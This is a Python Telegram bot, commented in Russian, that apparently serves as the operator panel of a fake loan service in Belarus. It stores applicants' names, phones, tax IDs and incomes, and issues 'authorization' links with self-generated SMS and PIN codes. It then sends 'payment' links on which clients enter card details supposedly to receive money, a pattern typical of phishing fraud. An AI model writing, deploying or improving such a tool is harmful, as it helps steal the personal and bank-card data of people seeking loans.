import asyncio
import logging
import os
import random
import sqlite3
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command

# ========== КОНФИГ ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
SITE_URL = os.environ.get("SITE_URL", "https://yourdomain.com")

# ========== НАСТРОЙКА ==========
logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

# ========== БАЗА ДАННЫХ ==========
def init_db():
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS applications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            fullname TEXT,
            phone TEXT,
            inn TEXT,
            income REAL,
            term INTEGER,
            amount REAL,
            payment REAL,
            session_id TEXT UNIQUE,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS auth_sessions (
            session_id TEXT PRIMARY KEY,
            phone TEXT,
            sms_code TEXT,
            pin_code TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

def get_application(session_id):
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM applications WHERE session_id = ?', (session_id,))
    row = cursor.fetchone()
    conn.close()
    return row

def save_auth_session(session_id, phone, sms_code, pin_code):
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO auth_sessions (session_id, phone, sms_code, pin_code)
        VALUES (?, ?, ?, ?)
    ''', (session_id, phone, sms_code, pin_code))
    conn.commit()
    conn.close()

init_db()

# ========== КЛАВИАТУРЫ ==========
def get_admin_keyboard(session_id):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔐 Ссылка на авторизацию", callback_data=f"gen_auth:{session_id}")],
        [InlineKeyboardButton(text="💳 Ссылка на оплату", callback_data=f"gen_payment:{session_id}")],
        [InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject:{session_id}")]
    ])

# ========== ФУНКЦИЯ ДЛЯ ВЫЗОВА ИЗ ВЕБХУКА ==========
async def send_application_to_admin(data: dict):
    session_id = data['session_id']
    
    message = (
        f"🆕 <b>НОВАЯ ЗАЯВКА НА КРЕДИТ</b>\n\n"
        f"👤 ФИО: {data['fullname']}\n"
        f"📱 Телефон: {data['phone']}\n"
        f"🆔 ИНН: {data['inn'] or '—'}\n"
        f"💰 Доход: {data['income']} BYN\n"
        f"📅 Срок: {data['term']} мес\n"
        f"💵 Сумма: {data['amount']} BYN\n"
        f"📊 Платёж: ~{data['payment']} руб\n"
        f"🆔 Сессия: <code>{session_id}</code>"
    )
    
    await bot.send_message(ADMIN_CHAT_ID, message, parse_mode="HTML", reply_markup=get_admin_keyboard(session_id))

# ========== ОБРАБОТЧИКИ КНОПОК ==========
@dp.callback_query(F.data.startswith("gen_auth:"))
async def generate_auth_link(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    auth_link = f"{SITE_URL}/auth?session={session_id}"
    
    app = get_application(session_id)
    if app:
        fullname = app[1]
        amount = app[6]
        phone = app[2]
    else:
        fullname = "—"
        amount = "—"
        phone = ""
    
    sms_code = str(random.randint(10000, 99999))
    pin_code = str(random.randint(1000, 9999))
    
    save_auth_session(session_id, phone, sms_code, pin_code)
    
    await callback.message.answer(
        f"🔐 <b>ССЫЛКА ДЛЯ КЛИЕНТА</b>\n\n"
        f"👤 Клиент: {fullname}\n"
        f"💰 Сумма: {amount} BYN\n\n"
        f"🔗 <b>Ссылка на авторизацию:</b>\n"
        f"<code>{auth_link}</code>\n\n"
        f"📋 <b>Коды для клиента:</b>\n"
        f"🔢 SMS-код: <code>{sms_code}</code>\n"
        f"🔐 PIN-код: <code>{pin_code}</code>\n\n"
        f"📌 Отправьте ссылку и SMS-код клиенту.\n"
        f"PIN-код клиент введёт после SMS.",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("gen_payment:"))
async def generate_payment_link(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    payment_link = f"{SITE_URL}/payment?session={session_id}"
    
    app = get_application(session_id)
    if app:
        fullname = app[1]
        amount = app[6]
    else:
        fullname = "—"
        amount = "—"
    
    await callback.message.answer(
        f"💳 <b>ССЫЛКА ДЛЯ КЛИЕНТА</b>\n\n"
        f"👤 Клиент: {fullname}\n"
        f"💰 Сумма: {amount} BYN\n\n"
        f"🔗 <b>Ссылка на оплату:</b>\n"
        f"<code>{payment_link}</code>\n\n"
        f"📌 Отправьте ссылку клиенту.\n"
        f"Клиент введёт данные карты для получения средств.",
        parse_mode="HTML"
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("reject:"))
async def reject_application(callback: types.CallbackQuery):
    session_id = callback.data.split(":")[1]
    
    conn = sqlite3.connect('applications.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE applications SET status = "rejected" WHERE session_id = ?', (session_id,))
    conn.commit()
    conn.close()
    
    await callback.message.edit_reply_markup(reply_markup=None)
    await callback.message.answer(f"❌ Заявка <code>{session_id}</code> отклонена.", parse_mode="HTML")
    await callback.answer()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if message.chat.id != ADMIN_CHAT_ID:
        await message.answer("Этот бот только для администратора.")
        return
    
    await message.answer(
        "🤖 <b>Бот для управления кредитными заявками</b>\n\n"
        "✅ Новые заявки с сайта приходят сюда\n"
        "✅ Нажмите кнопку — бот даст ссылку и коды\n"
        "✅ Отправьте ссылку и SMS-код клиенту\n\n"
        "🔐 <b>Процесс:</b>\n"
        "1. Вы отправляете ссылку и SMS-код\n"
        "2. Клиент вводит телефон → получает доступ\n"
        "3. Клиент вводит PIN → доступ к оплате\n"
        "4. Клиент вводит карту → получает деньги",
        parse_mode="HTML"
    )

# ========== ЗАПУСК ==========
async def main():
    # Удаляем вебхук перед запуском (решает проблему Conflict)
    await bot.delete_webhook(drop_pending_updates=True)
    print("✅ Webhook deleted, starting polling...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
